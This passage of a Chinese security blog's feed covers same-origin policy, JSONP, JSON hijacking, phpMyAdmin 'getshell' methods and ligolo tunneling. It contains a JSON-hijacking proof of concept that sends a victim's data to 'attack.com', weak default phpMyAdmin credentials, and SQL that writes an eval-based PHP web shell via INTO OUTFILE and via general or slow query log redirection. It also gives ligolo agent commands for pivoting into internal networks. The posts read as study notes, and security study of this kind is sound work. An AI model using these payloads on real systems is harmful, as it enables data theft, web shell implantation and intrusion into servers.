alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略</title>
      <link href="/2025/01/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
      <url>/2025/01/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="1-同源策略"><a href="#1-同源策略" class="headerlink" title="1. 同源策略"></a>1. 同源策略</h4><p><strong>同源策略 (Same Origin Policy)</strong></p><ul><li>协议</li><li>域名</li><li>端口</li></ul><p>​ 同时满足这三种条件就是同源，当存在两个站点，其中有一项不满足相同条件的时候，我们即可说这两个站点不是同源站点，而当其中一个站点想请求另外一个站点的资源的时候我们边称它为<code>跨域请求</code>，而由于安全考虑，<code>跨域请求</code>会受到同源策略的限制</p><h5 id="1-1-不受影响的标签"><a href="#1-1-不受影响的标签" class="headerlink" title="1.1 不受影响的标签"></a>1.1 <strong>不受影响的标签</strong></h5><ol start="2"><li>img</li><li>iframe</li><li>link</li><li>css</li></ol><p>在同源策略（Same-Origin Policy）中，不同源（即不同协议、主机或端口）之间的资源访问受到限制，以增强安全性。不过，某些标签和资源类型有特定的规则：</p><ul><li><strong><code>&lt;script&gt;</code></strong>：不受同源策略限制，可以从不同源加载 JavaScript 文件。这使得从外部源加载脚本成为可能，但仍需注意跨站点脚本攻击（XSS）的风险。 主要是利用src属性</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong><code>&lt;img&gt;</code></strong>：不受同源策略限制，可以从不同源加载图片。这使得网页能够显示来自不同源的图像，但不会影响其他资源或进行脚本操作。</p></li><li><p><strong><code>&lt;iframe&gt;</code></strong>：同样不受同源策略限制，可以嵌入不同源的网页。这允许在一个网页中显示来自不同站点的内容，但需要小心防止点击劫持等安全问题。</p></li><li><p><strong><code>&lt;link&gt;</code></strong> 和 <strong>CSS</strong>：在加载外部样式表时不受同源策略限制。网页可以链接到来自不同源的 CSS 文件，以应用样式。 link 主要是引入外部资源的。</p></li></ul><p>​ 在HTML中&lt;a&gt;, &lt;form&gt;, &lt;img&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;link&gt; 等标签以及 Ajax 都可以指向一个资源地址 在这些标签中有以下的标签不受同源策略的限制</p><ol><li>script</li></ol><h4 id="2-同源策略的工作原理"><a href="#2-同源策略的工作原理" class="headerlink" title="2. 同源策略的工作原理"></a>2. 同源策略的工作原理</h4><p>同源策略的核心是：<strong>不同源的网页</strong>不能直接相互访问对方的数据。也就是说，<strong>一个网站的JavaScript代码不能访问另一个网站的数据</strong>，除非它们属于同一个源。</p><p>举个例子：</p><ul><li>如果你访问 <code>https://www.example.com</code> 网站，你的浏览器会阻止该网站的JavaScript代码去读取 <code>http://www.another.com</code> 网站的数据。</li><li>但是如果 <code>https://www.example.com</code> 和 <code>https://www.example.com</code> 是同一个源，那么它们之间的JavaScript代码可以互相访问。</li></ul><h4 id="3-同源策略的目标"><a href="#3-同源策略的目标" class="headerlink" title="3. 同源策略的目标"></a>3. 同源策略的目标</h4><ol><li><strong>防止跨站脚本攻击（XSS）</strong>：恶意网站的JavaScript代码不能访问受害者在其他网站上存储的数据（如cookie、localStorage等）。</li><li><strong>防止跨站请求伪造（CSRF）</strong>：恶意网站不能向受害者已登录的网站发送请求并带上受害者的凭证（如cookie）。</li></ol><h4 id="4-ajax请求"><a href="#4-ajax请求" class="headerlink" title="4. ajax请求"></a>4. ajax请求</h4><ol><li><p><strong>异步通信</strong>：</p><ul><li>AJAX请求通常是<strong>异步</strong>的，意味着发送请求后，页面不需要等待服务器响应，可以继续执行其他操作。当响应数据返回时，JavaScript会处理返回的数据并更新页面。</li></ul></li><li><p><strong>JavaScript发起</strong>：</p><ul><li>这种请求是由JavaScript代码发起的。最常用的方法是使用<code>XMLHttpRequest</code>对象或现代的<code>Fetch API</code>。</li></ul></li><li><p><strong>与服务器交互</strong>：</p><ul><li>AJAX用于与服务器进行交互，可以发送GET、POST等HTTP请求，获取或提交数据，并动态更新页面内容。</li></ul></li><li><p><strong>数据格式多样</strong>：</p><ul><li>虽然“XML”是AJAX的一个部分，但现代AJAX请求常常使用<strong>JSON</strong>作为数据交换格式，因为JSON比XML更轻量级，解析更高效。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsonp</title>
      <link href="/2025/01/15/jsonp/"/>
      <url>/2025/01/15/jsonp/</url>
      
        <content type="html"><![CDATA[<h4 id="1-jsonp"><a href="#1-jsonp" class="headerlink" title="1. jsonp"></a>1. jsonp</h4><p>jsonp是一种协议，准确的说，他是json的一种使用模式，为了解决Json受同源策略限制的问题<br>是一种使用JSON格式数据的跨域请求方式。其主要目的是绕过同源策略限制，使得网页可以通过<code>&lt;script&gt;</code>标签从不同源的服务器加载数据。主要还是利用同源策略中script 标签的src属性可以加载外部的js这个特性来跨域传输json数据。</p><h4 id="2-jsonp实现"><a href="#2-jsonp实现" class="headerlink" title="2. jsonp实现"></a>2. jsonp实现</h4><p>script标签的src属性能够发起跨域请求的原理来实现的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   <span class="comment">&lt;!-- 回调函数--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   function callback(data)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   alert(&quot;name:&quot;+data.username+&quot;  passwrod:&quot;+data.password);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.43.136/test.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时就谈到一个很抽象的问题，首先我们利用script标签的ajax请求,这种就是有同源策略限制。因此我们不能使用ajax而是采用src属性去加载跨域资源</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"> <span class="attr">url</span>: <span class="string">&#x27;http://192.168.7.166/test.json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"> <span class="attr">type</span>:<span class="string">&quot;get&quot;</span>,     </span></span><br><span class="line"><span class="language-javascript"> <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript"> <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);&#125;</span></span><br><span class="line"><span class="language-javascript"> &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在test.json中按照javascript代码规范调用callback函数，并将数据作为参数传入</span><br><span class="line">我们知道，在JSONP跨域中，我们是可以传入一个函数名的参数如callback，然后JSONP端点会根据我们的传参动态生成JSONP数据响应回来。?callback=handleData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">callback(&#123; username: &quot;Sentim&quot;, password: &quot;123456&quot; &#125;)</span><br></pre></td></tr></table></figure><h4 id="3-jsonp-导致xss"><a href="#3-jsonp-导致xss" class="headerlink" title="3. jsonp 导致xss"></a>3. jsonp 导致xss</h4><p>因为传递了一个参数 ，这个 callback可控 application&#x2F;json text&#x2F;json application&#x2F;javascript、text&#x2F;javascript  返回包的类型这几种无法弹窗</p><h4 id="4-json劫持"><a href="#4-json劫持" class="headerlink" title="4. json劫持"></a>4. json劫持</h4><p>json劫持其实我感觉原理很简单，很明显有时候一些数据由于同源策略限制，前端的页面就可能会采用jsonp格式进行跨域资源共享。但是我们根据jsonp的功能，我们可以自定义js函数进行一些恶意操作。既然你能访问，代表我也可以访问。其实主要就用在跨域上面了，如果说跨域还需要加验证比如token什么的，那就难搞了。</p><h5 id="4-1-登陆界面"><a href="#4-1-登陆界面" class="headerlink" title="4.1 登陆界面"></a>4.1 登陆界面</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$pwd</span> === <span class="string">&#x27;admin&#x27;</span> || <span class="variable">$name</span>===<span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$pwd</span> === <span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://victim.com/info.php?callback=jsonp&quot;&gt;用户信息&lt;/a&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://victim.com/main.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">   &lt;head&gt;</span></span><br><span class="line"><span class="string">      &lt;title&gt;登录&lt;/title&gt;</span></span><br><span class="line"><span class="string">      &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;/head&gt;</span></span><br><span class="line"><span class="string">   &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;form action=&quot;login.php&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">         用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span></span><br><span class="line"><span class="string">         密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</span></span><br><span class="line"><span class="string">         &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">   &lt;/body&gt;</span></span><br><span class="line"><span class="string">   &lt;/html&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;欢迎您, &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br data-tomark-pass&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-2-信息查询"><a href="#4-2-信息查询" class="headerlink" title="4.2 信息查询"></a>4.2 信息查询</h5><p>这就是我们要劫持的页面，一般这个页面就是跨域。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;&#x27;id&#x27;:1,&#x27;name&#x27;:&#x27;Sentiment&#x27;&#125;)&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;guest&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;&#x27;id&#x27;:2,&#x27;name&#x27;:&#x27;guest&#x27;&#125;)&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;获取个人信息失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-3-构造恶意请求"><a href="#4-3-构造恶意请求" class="headerlink" title="4.3 构造恶意请求"></a>4.3 构造恶意请求</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;lol&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jsonp_hack</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;JSONP hijacking&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> h = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key in v)&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            a = key + <span class="string">&#x27; : &#x27;</span> + v[key] + <span class="string">&#x27; ,&#x27;</span>;</span><br><span class="line">            h += a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(h);</span><br><span class="line">        $.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://attack.com/index.html?value=&#x27;</span>+h);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://victim.com/info.php?callback=jsonp_hack&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin-getshell姿势</title>
      <link href="/2025/01/14/phpmyadmin-getshell%E5%A7%BF%E5%8A%BF/"/>
      <url>/2025/01/14/phpmyadmin-getshell%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h4 id="1-phpmyadmin"><a href="#1-phpmyadmin" class="headerlink" title="1. phpmyadmin"></a>1. phpmyadmin</h4><p>phpMyAdmin 是一个用 PHP 编写的开源工具，旨在通过 Web 界面管理 MySQL 和 MariaDB 数据库。</p><h4 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2. getshell"></a>2. getshell</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113162904.png" alt="image.png"></p><h4 id="2-1-弱口令"><a href="#2-1-弱口令" class="headerlink" title="2.1 弱口令"></a>2.1 弱口令</h4><p>root:root<br>root:(space)<br>mysql:mysql</p><h4 id="2-2-写shell"><a href="#2-2-写shell" class="headerlink" title="2.2  写shell"></a>2.2  写shell</h4><p>(1) 当前的数据库用户有写权限<br>(2) 知道web绝对路径<br>(3) web路径能写 secrue_file_priv不被设置</p><h6 id="2-2-1-权限查看"><a href="#2-2-1-权限查看" class="headerlink" title="2.2.1 权限查看"></a>2.2.1 权限查看</h6><p>权限可以看看phpmyadmin的一些权限控制<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113172639.png" alt="image.png"></p><h6 id="2-2-2变量查看"><a href="#2-2-2变量查看" class="headerlink" title="2.2.2变量查看"></a>2.2.2变量查看</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果secure_file_priv没有任何设置,则我们可以写马但是如果设置了对应的文件，我们就无法写入<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113173133.png" alt="image.png"></p><h6 id="2-2-3-网站路径"><a href="#2-2-3-网站路径" class="headerlink" title="2.2.3 网站路径"></a>2.2.3 网站路径</h6><ol><li>phpinfo</li></ol><table><thead><tr><th>DOCUMENT_ROOT</th><th>C:&#x2F;phpStudy&#x2F;WWW</th></tr></thead><tbody><tr><td>2. 报错信息</td><td></td></tr><tr><td>3. 框架</td><td></td></tr><tr><td>4. 爆破</td><td></td></tr><tr><td>利用数据库路径去爆破猜测</td><td></td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这是数据库的路径条件依照这个猜测网站根目录 </span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%datadir%&#x27;</span>; </span><br></pre></td></tr></table></figure><p>利用sql语句去猜测爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">针对路径进行fuzz </span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/$fuzz$/shell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">load data infile &quot;/etc/passwd&quot; <span class="keyword">into</span> <span class="keyword">table</span> test;</span><br><span class="line">加载文件内容进入到执行的数据库表 </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">不存在将会报错Can&#x27;t create/write to file &#x27;/var/www/html/666.txt&#x27; (Errcode: 2)；</span></span><br><span class="line"><span class="comment">如果存在但是目录写不进去将返回(Errcode: 13)；没权限</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h6 id="2-2-4-shell写入"><a href="#2-2-4-shell写入" class="headerlink" title="2.2.4 shell写入"></a>2.2.4 shell写入</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php echo 1;@eval($_POST[cmd]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="3-通用查询日志shell"><a href="#3-通用查询日志shell" class="headerlink" title="3. 通用查询日志shell"></a>3. 通用查询日志shell</h4><p>mysql可以设置通用日志文件，他跟直接利用<code>LOAD DATA INFILE</code> 和 <code>SELECT INTO OUTFILE</code>等写入操作的语句不同，它不受<code>secrue_file_priv</code>的影响。只要我们有权限并且知道绝对路径就可以。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> &quot;C:/phpStudy/WWW/404.php&quot;;</span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?php phpinfo();@eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;;#一次没成功就把这句再执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于把mysql的日志功能给利用上了，将日志文件指定成php文件，再利用web的绝对路径然后进行解析.</p><h4 id="4-慢查询日志"><a href="#4-慢查询日志" class="headerlink" title="4. 慢查询日志"></a>4. 慢查询日志</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/slow.php&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="keyword">from</span> mysql.db <span class="keyword">where</span> sleep(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透-ssh搭建</title>
      <link href="/2025/01/14/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-ssh%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/01/14/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-ssh%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h4><p>大概看懂了ligolo的操作，首先我们在进行代理的时候要么使用单独使用ssh或者要么使用ssh搭配putty进行内网穿透。要么使用frp进行穿透。但是ssh有一定的局限性，如果说我们遇到了ssh不存在的情况，就无法使用。于是我发现ligolo其实是一个利用了cs之间的连接去代替了ssh连接。同时也是在攻击端开启一个服务器，所有的流量都走这个代理，然后服务器将流量通过cs的连接转发到内网机器进行攻击。</p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h4><h5 id="2-1-服务端"><a href="#2-1-服务端" class="headerlink" title="2.1 服务端"></a>2.1 服务端</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./proxy -selfcert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端连接上之后</span></span><br><span class="line">session</span><br><span class="line">开始启动tun接口</span><br><span class="line">start --tun ligolo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示接口</span></span><br><span class="line">tunnel_list</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-2-客户端"><a href="#2-2-客户端" class="headerlink" title="2.2 客户端"></a>2.2 客户端</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">忽略 验证直接连接</span></span><br><span class="line">agent.exe -connect 192.168.53.128:11601  -ignore-cert</span><br></pre></td></tr></table></figure><h5 id="2-3-代理服务器"><a href="#2-3-代理服务器" class="headerlink" title="2.3 代理服务器"></a>2.3 代理服务器</h5><p>此时我们已经完成了cs的连接，就差一个代理服务器。所以此时我们开一个tun接口然后把所有流量都通过这个tun接口出去。完成代理的搭建。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">建立一个用户的tun</span></span><br><span class="line">ip tuntap add user tom mode tun ligolo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开接口</span></span><br><span class="line">ip link set ligolo up</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">增加代理路由</span></span><br><span class="line">ip route add 240.0.0.1/32 dev ligolo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个网段随便写 b段 c段等 也可以删除</span></span><br><span class="line"></span><br><span class="line">ip route del 192.168.0.0/16 dev ligolo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除</span></span><br><span class="line">ip link delete ligolo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
